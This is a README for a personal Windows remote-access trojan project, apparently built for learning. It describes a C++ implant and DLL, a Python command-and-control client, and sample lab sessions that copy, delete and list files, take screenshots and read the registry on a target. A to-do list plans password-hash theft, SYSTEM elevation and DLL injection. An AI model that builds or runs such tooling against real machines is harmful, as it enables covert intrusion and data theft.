# Windows-RAT
This repository will serve as an exploratory environment where I will rely primarily on C++ and Windows APIs to delve into the deeper aspects of Windows security management along with the varying components and architectures that come within the Windows environment.

## Table of Contents
- [Windows-RAT](#windows-rat)
  - [Table of Contents](#table-of-contents)
  - [Repository Breakdown](#repository-breakdown)
    - [Pcaps](#pcaps)
    - [RAT-DLL](#rat-dll)
    - [RAT-Py](#rat-py)
    - [RAT-Exe](#rat-exe)
  - [Assumptions](#assumptions)
  - [Testing Environment](#testing-environment)
  - [Build Environment](#build-environment)
  - [Examples](#examples)
    - [Startup](#startup)
      - [Required Args](#required-args)
      - [Optional Args](#optional-args)
    - [Perform a *put file*](#perform-a-put-file)
      - [Required Args](#required-args-1)
      - [Optional Args](#optional-args-1)
    - [Perform a *get file*](#perform-a-get-file)
      - [Required Args](#required-args-2)
      - [Optional Args](#optional-args-2)
    - [Perform a *dir list*](#perform-a-dir-list)
      - [Required Args](#required-args-3)
      - [Optional Args](#optional-args-3)
    - [Perform a *delete file*](#perform-a-delete-file)
      - [Required Args](#required-args-4)
      - [Optional Args](#optional-args-4)
    - [Perform a *screenshot*](#perform-a-screenshot)
      - [Required Args](#required-args-5)
      - [Optional Args](#optional-args-5)
    - [Perform a *registry read*](#perform-a-registry-read)
      - [Required Args](#required-args-6)
      - [Optional Args](#optional-args-6)
    - [Perform a *process list*](#perform-a-process-list)
      - [Required Args](#required-args-7)
      - [Optional Args](#optional-args-7)
  - [TODO](#todo)
    - [Exisiting Features:](#exisiting-features)
    - [New Features:](#new-features)
    - [Bugs](#bugs)

## Repository Breakdown

### Pcaps
Packet captures between C2 and implant in a test environment for different commands. These help reinforce how interaction between our C2 and implant works for each command type. 

### RAT-DLL
All cpp *implant* side code that will, upon executing, open up a port on target and listen for commands sent by the user via Python CLI.

### RAT-Py
All py *client* side code that will, upon executing, open up a port on client and send commands to the implant via user input in the CLI.

### RAT-Exe
All cpp *implant* side code that will, upon executing, survey the target prior to loading our DLL that implements our functionality and opens communications back to client to accept commands.

## Assumptions
Current assumptions will include:
- The user has access to the target machine + network
- The user has the ability to or already has dropped .exe and .dll on target
- The user has remote shell/execution capabilities to launch payload on target
- Traditional antivirus programs have been disabled/mitigated

## Testing Environment
- Target machine is Window 10 Education version 10.0.19043 build 19043
- Python version for client is 3.7.16 (important for scapy use)

## Build Environment
- Visual Studio 2019 version 16.11.20

## Examples
### Startup
#### Required Args
- ip - IP address of target
- port - port number our implant is listening on
#### Optional Args
- N/A
```
pjsacchet@Patrick-Desktop:/mnt/c/Users/Admin/Projects/Personal/Windows-RAT/RAT-Py$ python3 RAT_Py_Main.py -ip 192.168.111.128 -port 1550
Reaching out to agent for connection establishment... 
Connected to agent at 192.168.111.128 on port 1550 
Please select from the following options:

                putfile - Write a file to a location on target

                getfile - Get a file from a specific location on target

                dirlist - Perform a dir list for a particular directory on target

                deletefile - Perform a delete file off target

                screenshot - Take a screenshot of target (will get file and delete file off target)

                regread - Read a registry key off target

                processlist -  List all running processes off target

                exit - Task agent to shutdown gracefully and cleanup

```

### Perform a *put file*
#### Required Args
- filepath - Path (locally) to file with contents we are writing to target
- outfilepath - Remote file path where we want to write our file contents to 
#### Optional Args
- overwrite - Whether or not to overwrite the file locally if it already exits (default is false)
```
> putfile
Required params:

               -filepath - local path to file we are writing

               -outputfilepath - remote path we are writing to

Optional params:

               -overwrite - overwrite the file if it already exists (default: false)

> -filepath /mnt/c/Users/Admin/Projects/Personal/test.txt -outputfilepath C:\test2.txt
Sending command...
Sending file path...
Sending file contents...
Sending overwrite...
Sent data to implant; waiting on response code...
Successful file put!
Please select from the following options:

                putfile - Write a file to a location on target

                getfile - Get a file from a specific location on target

                dirlist - Perform a dir list for a particular directory on target

                deletefile - Perform a delete file off target

                screenshot - Take a screenshot of target (will get file and delete file off target)

                regread - Read a registry key off target

                processlist -  List all running processes off target

                exit - Task agent to shutdown gracefully and cleanup
```

### Perform a *get file*
#### Required Args
- filepath - File path on target to the file we want to get 
- outfilepath - Local file path where we want to write our file contents to 
#### Optional Args
- overwrite - Whether or not to overwrite the file locally if it already exits (default is false)
```
> getfile
Required params:

                -filepath - path to file on target

                -outfilepath - file to write to locally
Optional params:
                - overwrite - overwrite the file locally if it already exists
                
> -filepath C:\test.txt -outfilepath /mnt/c/Users/Admin/Projects/Personal/Windows-RAT/TestFiles/test.txt
Successful file get! Getting file contents...
Successfully wrote file contents to /mnt/c/Users/Admin/Projects/Personal/Windows-RAT/TestFiles/test.txt
Please select from the following options:

                putfile - Write a file to a location on target

                getfile - Get a file from a specific location on target

                dirlist - Perform a dir list for a particular directory on target

                deletefile - Perform a delete file off target

                screenshot - Take a screenshot of target (will get file and delete file off target)

                regread - Read a registry key off target

                processlist -  List all running processes off target

                exit - Task agent to shutdown gracefully and cleanup
```

### Perform a *dir list*
#### Required Args
- path - path to directory we would like to list off target
#### Optional Args
- N/A
```
> dirlist
Required params:

                -path - path to directory we're listing off target

> -path C:\Users\Admin\Documents
Sending command...
Sending dir path...
Files in C:\Users\Admin\Documents:
        .
        ..
        Debugger-Command.txt
        desktop.ini
        Internals-DLL.dll
        Internals-Exe.exe
        My Music
        My Pictures
        My Videos
        RAT-Dll.dll
        RAT-Exe.exe

Successful dir list!

Please select from the following options:

                putfile - Write a file to a location on target

                getfile - Get a file from a specific location on target

                dirlist - Perform a dir list for a particular directory on target

                deletefile - Perform a delete file off target

                screenshot - Take a screenshot of target (will get file and delete file off target)

                regread - Read a registry key off target

                processlist -  List all running processes off target

                exit - Task agent to shutdown gracefully and cleanup
```

### Perform a *delete file*
#### Required Args
- filepath - path to the file we're deleting off target
#### Optional Args
- N/A
```
> deletefile
Required params:

                -filepath - path to the file we're deleting off target

> -filepath C:\test2.txt
Sending command...
Sending file path...
Successful delete file!

Please select from the following options:

                putfile - Write a file to a location on target

                getfile - Get a file from a specific location on target

                dirlist - Perform a dir list for a particular directory on target

                deletefile - Perform a delete file off target

                screenshot - Take a screenshot of target (will get file and delete file off target)

                regread - Read a registry key off target

                processlist -  List all running processes off target

                exit - Task agent to shutdown gracefully and cleanup
```

### Perform a *screenshot*
#### Required Args
- filepath - path where we would like to write our screenshot to locally
#### Optional Args
- N/A
```
> screenshot
Required params:

                -filepath - Path where we would like to write our screenshot to locally

> -filepath /mnt/c/Screenshots/screenshot.bmp
Sending command...
Successful screenshot! Getting file size...
File is 14745654 bytes; Receiving data...
Successfully wrote file to disk... awaiting implant reponse code...
Successful screenshot!

Please select from the following options:

                putfile - Write a file to a location on target

                getfile - Get a file from a specific location on target

                dirlist - Perform a dir list for a particular directory on target

                deletefile - Perform a delete file off target

                screenshot - Take a screenshot of target (will get file and delete file off target)

                regread - Read a registry key off target

                processlist -  List all running processes off target

                exit - Task agent to shutdown gracefully and cleanup
```

### Perform a *registry read*
#### Required Args
- keypath - path to key we're reading off target 
- value - name of the value we're reading from the key
#### Optional Args
- N/A
```
> regread
Required params:

                -keypath - Path to the registry key we'd like to read

                -value - Name of the value we want to read

> -keypath HKLM\SYSTEM\CurrentControlSet\Control -value CurrentUser
Sending command...
Sending key path...
Sending value name...
Successful reg read file! Getting key size...
Key data is 9 bytes; Receiving data...
Key HKLM\SYSTEM\CurrentControlSet\Control with value CurrentUser returned: USERNAME

Please select from the following options:

                putfile - Write a file to a location on target

                getfile - Get a file from a specific location on target

                dirlist - Perform a dir list for a particular directory on target

                deletefile - Perform a delete file off target

                screenshot - Take a screenshot of target (will get file and delete file off target)

                regread - Read a registry key off target

                processlist -  List all running processes off target

                exit - Task agent to shutdown gracefully and cleanup
```

### Perform a *process list*
#### Required Args
- N/A
#### Optional Args
- N/A
```
> processlist
Required params:

                - N/A

Sending command...
Implant found 25 processes:
        svchost.exe
                PID: 4000
        sihost.exe
                PID: 5672
        svchost.exe
                PID: 5028
        taskhostw.exe
                PID: 6052
        Explorer.EXE
                PID: 4252
        svchost.exe
                PID: 4092
        StartMenuExperienceHost.exe
                PID: 5200
        TextInputHost.exe
                PID: 2240
        RuntimeBroker.exe
                PID: 3672
        UserOOBEBroker.exe
                PID: 6200
        SearchApp.exe
                PID: 6336
        RuntimeBroker.exe
                PID: 6572
        SecurityHealthSystray.exe
                PID: 3132
        vmtoolsd.exe
                PID: 1692
        svchost.exe
                PID: 8164
        dbgview64.exe
                PID: 7700
        RuntimeBroker.exe
                PID: 7564
        cmd.exe
                PID: 7028
        conhost.exe
                PID: 5576
        cmd.exe
                PID: 6124
        conhost.exe
                PID: 900
        DllHost.exe
                PID: 1040
        ApplicationFrameHost.exe
                PID: 336
        PhoneExperienceHost.exe
                PID: 7040
        RAT-Exe.exe
                PID: 1348

Successful process list!

Please select from the following options:

                putfile - Write a file to a location on target

                getfile - Get a file from a specific location on target

                dirlist - Perform a dir list for a particular directory on target

                deletefile - Perform a delete file off target

                screenshot - Take a screenshot of target (will get file and delete file off target)

                regread - Read a registry key off target

                processlist -  List all running processes off target

                exit - Task agent to shutdown gracefully and cleanup
```

## TODO
### Exisiting Features: 
- Flesh out getfile functionality
  - Eventually add flags for offsets into file and chunksizes to send back to C2?
  - Should send back file size first then full size... currently only take 1024 bytes
- Flesh out putfile functionality
  - Implement C2 OK messages to ensure it has the param or resend if need be
- Flesh out dirlist functionality
  - Implement recursive dir lists + additional file info 
- Flesh out deletefile functionality 
  - Return number of bytes we successfully deleted?
- Flesh out screenshot functionality
  - Refactor; add output param for file buffer contents and send our data back in the caller not callee
- Flesh out registry functionality
  - Handle different reg data types
    - Should send back data type as separate return from implant and handle as needed in python scripting 
- Flesh out process list functionality
  
### New Features:
- Implement registry key write add/delete
  - Add registry key value listing 
- Implement get system info 
- Implement password hash stealing via registry reads 
- Enable SYSTEM elevation
  - Have exe inject our dll into some other process's memory 
  - Or simply call system API with dll - rundll or something similar 
- Process query
  - Return specific info about a particular process
- Driver list
  - Return specific info about a particular driver
  - List all loaded drivers
- Start/stop processes?
  - Flags for permissions, process name etc.
- User list
  - Get logged on users, all users
  - Can do this via registry... or other way?
- Have exe perform survey, report results back to C2 and have C2 send DLL payload for loading 
- Whoami-esq command
- Implement basic encryption? 
  - Give both implant and C2 same key or something for packet encryption
- Add specific error messages and translate function for easy debug messages
- Currently only support ASCII... could do unicode pretty easily?
  
### Bugs
- Exe does not exit 'cleanly'
- Even if exe exits we do not alert our C2, so it still thinks its connected
- Put file
  - Large files may fail due to socket streams mixing comamnd values
